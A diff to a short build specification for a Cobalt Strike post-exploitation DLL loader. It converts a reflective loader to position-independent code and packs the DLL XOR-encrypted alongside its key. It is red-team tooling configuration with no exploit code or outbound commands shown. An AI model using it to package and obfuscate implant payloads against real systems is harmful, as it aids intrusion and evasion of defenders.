@@ -1,23 +1,24 @@
 name     "Beacon Postex Loader"
-describe "Reflective loader for Cobalt Strike's postex DLLs"
+describe "PIC loader for Cobalt Strike's postex DLLs"
 author   "Daniel Duggan (@_RastaMouse)"
 
 x64:
 	load "bin/loader.x64.o"
-		make pic +optimize +disco +mutate
-
+		make pic +gofirst +optimize +disco
+		dfr "resolve" "strings"
 		patch "pGetModuleHandle" $GMH
 		patch "pGetProcAddress"  $GPA
+		mergelib "../libtcg.x64.zip"
 
-		generate $KEY 8192
+	generate $KEY 128
 
-		push $DLL
-			xor $KEY
-			preplen
-			link "postex_dll"
+	push $DLL
+		xor $KEY
+		preplen
+		link "dll"
 
-		push $KEY
-			preplen
-			link "xor_key"
+	push $KEY
+		preplen
+		link "key"
 	
 	export
